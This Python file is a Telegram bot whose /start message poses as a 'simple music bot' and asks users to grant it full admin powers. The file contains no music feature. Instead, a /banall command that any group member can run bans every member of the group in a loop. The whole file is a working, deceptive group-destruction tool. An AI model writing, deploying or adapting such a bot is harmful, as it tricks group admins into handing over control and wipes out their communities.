import os
import logging
from os import getenv
from pyrogram import Client, filters, idle
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.errors import ChatAdminRequired

logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logging.getLogger("pyrogram").setLevel(logging.WARNING)

# config vars
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
OWNER = os.getenv("OWNER")

# pyrogram client
app = Client(
            "banall",
            api_id=API_ID,
            api_hash=API_HASH,
            bot_token=BOT_TOKEN,
)

@app.on_message(
filters.command("start")
& filters.private            
)
async def start_command(client, message: Message):
  await message.reply_photo(
                            photo = f"https://telegra.ph/file/e8fd4c7f3abeadacdd2b8.jpg",
                            caption = f"𝐇𝐄𝐘, 𝐓𝐇𝐈𝐒 𝐈𝐒 𝐀 𝐒𝐈𝐌𝐏𝐋𝐄 𝐌𝐔𝐒𝐈𝐂 𝐁𝐎𝐓 𝐖𝐇𝐈𝐂𝐇 𝐈𝐒 𝐁𝐀𝐒𝐄𝐃 𝐎𝐍 𝐀 𝐏𝐘𝐓𝐇𝐎𝐍 𝐏𝐑𝐎𝐆𝐑𝐀𝐌 𝐓𝐎 ,  𝐏𝐋𝐀𝐘 𝐀𝐋𝐋 𝐓𝐘𝐏𝐄 𝐎𝐅 𝐌𝐔𝐒𝐈𝐂 𝐈𝐍 𝐓𝐇𝐄 𝐆𝐑𝐎𝐔𝐏\n\n𝐓𝐎 𝐂𝐇𝐄𝐂𝐊 𝐌𝐘 𝐀𝐁𝐈𝐋𝐈𝐓𝐘 𝐆𝐈𝐕𝐄 𝐌𝐄 𝐅𝐔𝐋𝐋 𝐏𝐎𝐖𝐄𝐑𝐒\n\n𝐄𝐍𝐉𝐎𝐘 𝐓𝐇𝐄 💀☠️ 𝐌𝐎𝐍𝐒𝐓𝐄𝐑 𝐁𝐎𝐓 𝐒𝐎𝐂𝐈𝐄𝐓💀☠️ /start.",
  reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "𝐎𝐖𝐍𝐄𝐑", url=f"https://t.me/{OWNER}")
                ],
                
                [
                    InlineKeyboardButton(
                    "𝐎𝐅𝐅𝐈𝐂𝐄", url=f"https://t.me/aboutmonstar")
                ]
           ]
      )
)

@app.on_message(
filters.command("banall") 
& filters.group
)
async def banall_command(client, message: Message):
    print("getting memebers from {}".format(message.chat.id))
    async for i in app.get_chat_members(message.chat.id):
        try:
            await app.ban_chat_member(chat_id = message.chat.id, user_id = i.user.id)
            print("kicked {} from {}".format(i.user.id, message.chat.id))
        except Exception as e:
            print("failed to kicked {} from {}".format(i.user.id, e))           
    print("process completed")
    

# start bot client
app.start()
print("Banall-Bot Booted Successfully")
idle()
